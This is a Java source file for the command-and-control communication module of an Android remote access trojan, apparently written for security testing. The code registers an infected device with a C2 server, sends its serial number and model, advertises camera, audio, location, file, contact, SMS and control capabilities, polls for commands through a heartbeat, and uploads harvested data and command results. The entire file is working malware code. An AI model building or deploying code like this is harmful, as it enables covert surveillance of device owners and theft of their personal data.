package com.security.test.rat.communication;

import android.content.Context;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * CommunicationManager - Handles communication with C2 server
 * 
 * Features:
 * - HTTP/HTTPS communication
 * - Command execution
 * - Data exfiltration
 * - Heartbeat mechanism
 * - Retry logic
 */
public class CommunicationManager {
    
    private static final String TAG = "CommunicationManager";
    
    private Context context;
    private String serverUrl;
    private String clientId;
    private boolean isConnected = false;
    private boolean isRunning = false;
    
    // Communication settings
    private int heartbeatInterval = 30; // seconds
    private int retryAttempts = 3;
    private int connectionTimeout = 10000; // 10 seconds
    
    // Executors for background operations
    private ExecutorService networkExecutor;
    private ScheduledExecutorService heartbeatExecutor;
    
    // Communication callbacks
    private CommunicationCallback callback;
    
    public interface CommunicationCallback {
        void onCommandReceived(String command, JSONObject parameters);
        void onConnectionStatusChanged(boolean connected);
        void onError(String error);
    }
    
    public CommunicationManager(Context context, String serverUrl) {
        this.context = context;
        this.serverUrl = serverUrl;
        this.clientId = generateClientId();
        
        this.networkExecutor = Executors.newCachedThreadPool();
        this.heartbeatExecutor = Executors.newScheduledThreadPool(1);
    }
    
    /**
     * Initialize communication manager
     */
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing CommunicationManager");
            
            // Test server connection
            if (!testConnection()) {
                Log.w(TAG, "Server connection test failed");
                return false;
            }
            
            // Register client with server
            if (!registerClient()) {
                Log.w(TAG, "Client registration failed");
                return false;
            }
            
            // Start heartbeat
            startHeartbeat();
            
            isRunning = true;
            Log.i(TAG, "CommunicationManager initialized successfully");
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize CommunicationManager", e);
            return false;
        }
    }
    
    /**
     * Cleanup resources
     */
    public void cleanup() {
        try {
            isRunning = false;
            
            if (heartbeatExecutor != null) {
                heartbeatExecutor.shutdown();
                try {
                    if (!heartbeatExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                        heartbeatExecutor.shutdownNow();
                    }
                } catch (InterruptedException e) {
                    heartbeatExecutor.shutdownNow();
                }
            }
            
            if (networkExecutor != null) {
                networkExecutor.shutdown();
                try {
                    if (!networkExecutor.awaitTermination(5, TimeUnit.SECONDS)) {
                        networkExecutor.shutdownNow();
                    }
                } catch (InterruptedException e) {
                    networkExecutor.shutdownNow();
                }
            }
            
            Log.i(TAG, "CommunicationManager cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during CommunicationManager cleanup", e);
        }
    }
    
    /**
     * Test server connection
     */
    private boolean testConnection() {
        try {
            URL url = new URL(serverUrl + "/health");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.setConnectTimeout(connectionTimeout);
            connection.setReadTimeout(connectionTimeout);
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
            
            boolean connected = responseCode == 200;
            isConnected = connected;
            
            if (callback != null) {
                callback.onConnectionStatusChanged(connected);
            }
            
            Log.i(TAG, "Server connection test: " + (connected ? "SUCCESS" : "FAILED"));
            return connected;
            
        } catch (Exception e) {
            Log.e(TAG, "Server connection test failed", e);
            isConnected = false;
            if (callback != null) {
                callback.onConnectionStatusChanged(false);
            }
            return false;
        }
    }
    
    /**
     * Register client with server
     */
    private boolean registerClient() {
        try {
            JSONObject clientInfo = new JSONObject();
            clientInfo.put("client_id", clientId);
            clientInfo.put("device_info", getDeviceInfo());
            clientInfo.put("capabilities", getCapabilities());
            
            String response = sendPostRequest("/api/clients/register", clientInfo.toString());
            if (response != null) {
                Log.i(TAG, "Client registered successfully");
                return true;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Client registration failed", e);
        }
        
        return false;
    }
    
    /**
     * Start heartbeat mechanism
     */
    private void startHeartbeat() {
        heartbeatExecutor.scheduleAtFixedRate(() -> {
            if (!isRunning) {
                return;
            }
            
            try {
                sendHeartbeat();
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat failed", e);
                isConnected = false;
                if (callback != null) {
                    callback.onConnectionStatusChanged(false);
                }
            }
        }, 0, heartbeatInterval, TimeUnit.SECONDS);
        
        Log.i(TAG, "Heartbeat started with interval: " + heartbeatInterval + "s");
    }
    
    /**
     * Send heartbeat to server
     */
    private void sendHeartbeat() {
        try {
            JSONObject heartbeat = new JSONObject();
            heartbeat.put("client_id", clientId);
            heartbeat.put("timestamp", System.currentTimeMillis());
            heartbeat.put("status", "alive");
            
            String response = sendPostRequest("/api/clients/heartbeat", heartbeat.toString());
            if (response != null) {
                // Check for commands in response
                processServerResponse(response);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send heartbeat", e);
        }
    }
    
    /**
     * Send data to server
     */
    public boolean sendData(String dataType, JSONObject data) {
        if (!isConnected) {
            Log.w(TAG, "Cannot send data - not connected to server");
            return false;
        }
        
        try {
            JSONObject payload = new JSONObject();
            payload.put("client_id", clientId);
            payload.put("data_type", dataType);
            payload.put("data", data);
            payload.put("timestamp", System.currentTimeMillis());
            
            String response = sendPostRequest("/api/data/upload", payload.toString());
            if (response != null) {
                Log.i(TAG, "Data sent successfully: " + dataType);
                return true;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send data: " + dataType, e);
        }
        
        return false;
    }
    
    /**
     * Send command result to server
     */
    public boolean sendCommandResult(String commandId, boolean success, String result, String error) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("client_id", clientId);
            payload.put("command_id", commandId);
            payload.put("success", success);
            payload.put("result", result);
            payload.put("error", error);
            payload.put("timestamp", System.currentTimeMillis());
            
            String response = sendPostRequest("/api/commands/result", payload.toString());
            if (response != null) {
                Log.i(TAG, "Command result sent successfully: " + commandId);
                return true;
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to send command result: " + commandId, e);
        }
        
        return false;
    }
    
    /**
     * Send HTTP POST request
     */
    private String sendPostRequest(String endpoint, String data) {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(serverUrl + endpoint);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "AndroidRAT-Client");
            connection.setConnectTimeout(connectionTimeout);
            connection.setReadTimeout(connectionTimeout);
            connection.setDoOutput(true);
            
            // Send data
            try (BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream()))) {
                writer.write(data);
                writer.flush();
            }
            
            // Read response
            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    return response.toString();
                }
            } else {
                Log.w(TAG, "Server returned error code: " + responseCode);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "HTTP POST request failed", e);
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
        
        return null;
    }
    
    /**
     * Process server response
     */
    private void processServerResponse(String response) {
        try {
            JSONObject jsonResponse = new JSONObject(response);
            
            // Check for commands
            if (jsonResponse.has("command")) {
                String command = jsonResponse.getString("command");
                JSONObject parameters = jsonResponse.optJSONObject("parameters");
                
                if (callback != null) {
                    callback.onCommandReceived(command, parameters);
                }
                
                Log.i(TAG, "Command received: " + command);
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Failed to parse server response", e);
        }
    }
    
    /**
     * Generate unique client ID
     */
    private String generateClientId() {
        return "android_client_" + System.currentTimeMillis() + "_" + android.os.Build.SERIAL;
    }
    
    /**
     * Get device information
     */
    private JSONObject getDeviceInfo() throws JSONException {
        JSONObject deviceInfo = new JSONObject();
        deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
        deviceInfo.put("model", android.os.Build.MODEL);
        deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
        deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
        deviceInfo.put("serial", android.os.Build.SERIAL);
        return deviceInfo;
    }
    
    /**
     * Get client capabilities
     */
    private JSONObject getCapabilities() throws JSONException {
        JSONObject capabilities = new JSONObject();
        capabilities.put("camera", true);
        capabilities.put("audio", true);
        capabilities.put("location", true);
        capabilities.put("files", true);
        capabilities.put("contacts", true);
        capabilities.put("sms", true);
        capabilities.put("control", true);
        return capabilities;
    }
    
    /**
     * Set communication callback
     */
    public void setCallback(CommunicationCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Set heartbeat interval
     */
    public void setHeartbeatInterval(int seconds) {
        this.heartbeatInterval = seconds;
        Log.i(TAG, "Heartbeat interval set to: " + seconds + "s");
    }
    
    /**
     * Get connection status
     */
    public boolean isConnected() {
        return isConnected;
    }
    
    /**
     * Get client ID
     */
    public String getClientId() {
        return clientId;
    }
    
    /**
     * Get server URL
     */
    public String getServerUrl() {
        return serverUrl;
    }
}
